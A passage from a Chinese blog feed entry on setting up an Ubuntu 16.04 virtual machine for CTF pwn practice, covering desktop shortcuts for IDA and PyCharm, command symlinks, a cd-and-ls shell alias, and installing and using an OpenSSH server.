alt="Linux虚拟机CTF环境搭建10.png"></p><p>在虚拟机中按参数手动设置代理即可：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA11.png" alt="Linux虚拟机CTF环境搭建11.png"></p><hr><h2 id="创建桌面快捷方式并添加到开始菜单"><a href="#创建桌面快捷方式并添加到开始菜单" class="headerlink" title="创建桌面快捷方式并添加到开始菜单"></a>创建桌面快捷方式并添加到开始菜单</h2><blockquote><p>这里以 IDA Freeware 8.2 为例，因为我 Ubuntu 22.04 安装的是 IDA Freeware 8.2，但是 <strong>Ubuntu 16.04 貌似不支持这么新的版本，会无法运行，所以这里主要演示如何创建桌面快捷方式并添加到开始菜单，建议不要安装太高版本的 IDA</strong></p></blockquote><p>在桌面打开终端</p><p>新建一个 IDA-Freeware-8.2.desktop 文件： <em>（Ubuntu 16.04 安装 IDA 后会自动在桌面新建一个快捷方式，可以不用手动创建，这里主要演示如何创建桌面快捷方式并添加到开始菜单）</em></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/桌面<span class="token function">sudo</span> <span class="token function">vim</span> IDA-Freeware-8.2.desktop<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>并写入以下内容： （注意按照自己实际情况修改路径）</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Version</span><span class="token operator">=</span><span class="token number">0.9</span>.4<span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Name</span><span class="token operator">=</span>IDA Freeware <span class="token number">8.2</span><span class="token assign-left variable">Comment</span><span class="token operator">=</span>Interactive Disassembler Freeware <span class="token number">8.2</span><span class="token assign-left variable">Icon</span><span class="token operator">=</span>/opt/idafree-8.2/appico64.png<span class="token assign-left variable">Exec</span><span class="token operator">=</span>/opt/idafree-8.2/ida64<span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">MimeType</span><span class="token operator">=</span>application/octet-stream<span class="token punctuation">;</span>application/mac-binary<span class="token punctuation">;</span>application/macbinary<span class="token punctuation">;</span>application/octet-stream<span class="token punctuation">;</span>application/x-binary<span class="token punctuation">;</span>application/x-macbinary<span class="token assign-left variable">StartupNotify</span><span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><table><thead><tr><th align="left">参数</th><th align="left">含义</th><th align="left">必要性</th></tr></thead><tbody><tr><td align="left"><code>[Desktop Entry]</code></td><td align="left">文件头，每个 Desktop 文件都以这个标签开始</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Version</code></td><td align="left">标明 Desktop Entry 的版本</td><td align="left">可选</td></tr><tr><td align="left"><code>Type</code></td><td align="left">Desktop 的类型, 常见值有 Application 和 Link</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Name</code></td><td align="left">程序名称，可自定义</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Comment</code></td><td align="left">程序描述，可自定义</td><td align="left">可选</td></tr><tr><td align="left"><code>Icon</code></td><td align="left">设置快捷方式的图标，支持 png 和 svg</td><td align="left">可选</td></tr><tr><td align="left"><code>Exec</code></td><td align="left">程序的启动命令, 可以带参数运行, 当 Type 为 Application 时有效</td><td align="left"><strong>必选</strong></td></tr><tr><td align="left"><code>Terminal</code></td><td align="left">是否在终端中运行, 当 Type 为 Application 时有效 <em>（对于没有图形界面的程序很有用）</em></td><td align="left">可选</td></tr><tr><td align="left"><code>MimeType</code></td><td align="left">设置该程序可以打开的文件类型</td><td align="left">可选</td></tr><tr><td align="left"><code>StartupNotify</code></td><td align="left">程序启动通知</td><td align="left">可选</td></tr></tbody></table><p>其他 <code>MimeType</code> 可打开的文件类型：<a href="https://blog.csdn.net/zhaoyw2008/article/details/46647723">完整的 mime type 列表-CSDN博客</a></p><p>增加执行权限：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">chmod</span> +x IDA-Freeware-8.2.desktop<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后将 .desktop 文件存放到 <code>/usr/share/applications/</code> 目录下</p><p>程序就会现在开始菜单中，同时也可以在 <code>右键 -&gt; 使用其他应用程序打开</code> 中找到，然后也可以自己将应用固定到任务栏，方便打开</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">cd</span> ~/桌面<span class="token function">sudo</span> <span class="token function">mv</span> IDA-Freeware-8.2.desktop /usr/share/applications/<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><hr><p>jetbrains 全家桶等等创建桌面快捷方式就简单了，运行软件后：<code>工具栏 –&gt; Tools –&gt; Create Desktop Entery</code></p><p>以 Pycharm 自动创建的图标为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>Desktop Entry<span class="token punctuation">]</span><span class="token assign-left variable">Version</span><span class="token operator">=</span><span class="token number">1.0</span><span class="token assign-left variable">Type</span><span class="token operator">=</span>Application<span class="token assign-left variable">Name</span><span class="token operator">=</span>PyCharm Professional Edition<span class="token assign-left variable">Icon</span><span class="token operator">=</span>/opt/pycharm-2022.3/bin/pycharm.svg<span class="token assign-left variable">Exec</span><span class="token operator">=</span><span class="token string">"/opt/pycharm-2022.3/bin/pycharm.sh"</span> %f<span class="token assign-left variable">Comment</span><span class="token operator">=</span>Python IDE <span class="token keyword">for</span> Professional Developers<span class="token assign-left variable">Categories</span><span class="token operator">=</span>Development<span class="token punctuation">;</span>IDE<span class="token punctuation">;</span><span class="token assign-left variable">Terminal</span><span class="token operator">=</span>false<span class="token assign-left variable">StartupWMClass</span><span class="token operator">=</span>jetbrains-pycharm<span class="token assign-left variable">StartupNotify</span><span class="token operator">=</span>true<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="创建软连接将应用添加到终端启动"><a href="#创建软连接将应用添加到终端启动" class="headerlink" title="创建软连接将应用添加到终端启动"></a>创建软连接将应用添加到终端启动</h2><blockquote><p>这里以 IDA Freeware 8.2 为例，因为我 Ubuntu 22.04 安装的是 IDA Freeware 8.2，但是 <strong>Ubuntu 16.04 貌似不支持这么新的版本，会无法运行，所以这里主要演示如何创建软连接将应用添加到终端启动，建议不要安装太高版本的 IDA</strong></p></blockquote><p>以 IDA 为例：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">ln</span> <span class="token parameter variable">-s</span> <span class="token string">"/opt/idafree-8.2/ida64"</span> /usr/bin/ida<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这样在终端输入 <code>ida</code> 即可打开 IDA</p><blockquote><p><code>/usr/bin/ida</code> 中的 ida 名字可以自定义</p><p>这样只是在 <code>/usr/bin/</code> 下创建了一个软链接，指向 <code>/opt/idafree-8.2/ida64</code><br>若想删除软链接：</p><pre class="line-numbers language-none"><code class="language-none">unlink 软链接<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尽量不要用 <code>rm -rf</code> 删除软链接，如果不小心加上 <code>&#39;/&#39;</code> 就会删除源文件，例如：<code>rm -rf filename/</code></p></blockquote><hr><h2 id="终端将-cd-命令与-ls-命令连用"><a href="#终端将-cd-命令与-ls-命令连用" class="headerlink" title="终端将 cd 命令与 ls 命令连用"></a>终端将 cd 命令与 ls 命令连用</h2><blockquote><p>其实就是将 <code>cd xxx</code> 命令变为 <code>cd xxx &amp;&amp; ls</code>，好处也显而易见：可以少敲一条命令，方便~</p><p>但是 Ubuntu 不支持 <code>chdir</code>，所以不能直接用 <code>alias</code> 实现目录内容的显示</p></blockquote><p>注：以下操作对 Kali Linux 同样适用</p><p>如果你的 Ubuntu 配置了 zsh 终端，编辑 <code>~/zshrc</code> 配置文件（Kali Linux 自带 zsh 终端）：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> gedit ~/.zshrc<span class="token comment"># 如果没有配置 zsh 终端，则打开 ~/.bashrc</span><span class="token function">sudo</span> gedit ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>在文件最后加入以下内容，保存退出：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cd</span><span class="token operator">=</span>cdls<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-name function">cdls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">builtin</span> <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后使配置生效：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">source</span> ~/.zshrc<span class="token comment"># 如果没有配置 zsh 终端，则使用如下命令</span><span class="token builtin class-name">source</span> ~/.bashrc<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以看到效果了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA29.png" alt="Linux虚拟机CTF环境搭建29.png"></p><p>如果想顺便显示当前所在路径，只需将前面的内容改为：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">alias</span> <span class="token assign-left variable">cd</span><span class="token operator">=</span>cdls<span class="token punctuation">;</span><span class="token keyword">function</span> <span class="token function-name function">cdls</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token builtin class-name">builtin</span> <span class="token builtin class-name">cd</span> <span class="token string">"<span class="token variable">$1</span>"</span> <span class="token operator">&amp;&amp;</span> <span class="token builtin class-name">pwd</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ls</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后就可以看到效果了：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/Linux%E8%99%9A%E6%8B%9F%E6%9C%BACTF%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA30.png" alt="Linux虚拟机CTF环境搭建30.png"></p><hr><h2 id="配置-SSH-服务端"><a href="#配置-SSH-服务端" class="headerlink" title="配置 SSH 服务端"></a>配置 SSH 服务端</h2><blockquote><p>Linux 默认只安装了 SSH 客户端，有时候在执行 ssh 或者 scp 命令时会出现：<code>ssh: connect to host port 22: Connection refused</code> 拒绝连接</p><p>客户端和服务端的关系：<br>如果 A 机器想被 B 机器远程控制，那么 A 机器需要安装 SSH 服务端，B 机器需要安装 SSH 客户端<br>例如：B 机器通过 ssh 连接 A 机器，或者 B 机器通过 scp 上传文件到 A 机器</p></blockquote><p>查看 ssh 服务：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dpkg <span class="token parameter variable">-l</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果只显示有 openssh-client 没有 openssh-server，说明未安装 SSH 服务端</p><p>安装：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> openssh-server<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>确认 ssh-server 是否启动：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ps</span> <span class="token parameter variable">-e</span> <span class="token operator">|</span> <span class="token function">grep</span> <span class="token function">ssh</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如果看到 <code>sshd</code> 就说明 ssh-server 已经启动</p><p>如果出现其他问题的话，查看 SSH 服务端状态：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">service</span> <span class="token function">ssh</span> status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>重启 SSH 服务端：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">service</span> <span class="token function">ssh</span> restart<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>相关命令：</p><ul><li>连接服务端机器，假设 IP 为 192.168.1.1，用户名为 user （Windows、Linux 通用）</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ssh</span> user@192.168.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>从客户端机器上传当前目录下的 test 文件到服务端机器的 <code>~/</code> 或 <code>E:\</code> 目录下，假设 IP 为 192.168.1.1，用户名为 user</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token comment"># 服务端为 Linux</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token builtin class-name">test</span> user@192.168.1.1:~/<span class="token comment"># 服务端为 Windows</span><span class="token function">sudo</span> <span class="token function">scp</span> <span class="token parameter variable">-r</span> <span class="token builtin class-name">test</span> user@192.168.1.1:E:<span class="token punctuation">\</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其实只传文件的话，不需要 <code>-r</code> 参数，但是传文件夹需要，索性直接加上 <code>-r</code> 更方便</p><p>如果使用 ssh 连接出现如下报错：</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED<span class="token operator">!</span>     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY<span class="token operator">!</span>Someone could be eavesdropping on you right now <span class="token punctuation">(</span>man-in-the-middle attack<span class="token punctuation">)</span><span class="token operator">!</span>It is also possible that a <span class="token function">host</span> key has just been changed.<span class="token punctuation">..</span><span class="token punctuation">..</span><span class="token punctuation">..</span>Host key verification failed.lost connection<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>此报错是由于远程的主机的公钥发生了变化导致的</p><p>解决办法：<br>清除 ssh 所连接的 IP</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ssh-keygen <span class="token parameter variable">-R</span> 出问题的IP地址<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后再使用 ssh 重新连接即可</p><hr>]]></content>
    
    
    <summary type="html">由于 Ubuntu 16.04 环境比较老，导致 2023 年 Ubuntu 22.04 下的许多 PWN 环境搭建并不适用于 16.04，所以出了一个专门针对 16.04 的环境配置教程，并对与 22.04 中不同的地方专门做了讲解和处理</summary>
    
    
    
    <category term="Linux环境" scheme="https://www.uf4te.cn/categories/Linux%E7%8E%AF%E5%A2%83/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
    <category term="Linux" scheme="https://www.uf4te.cn/tags/Linux/"/>
    
  </entry>
  
</feed>
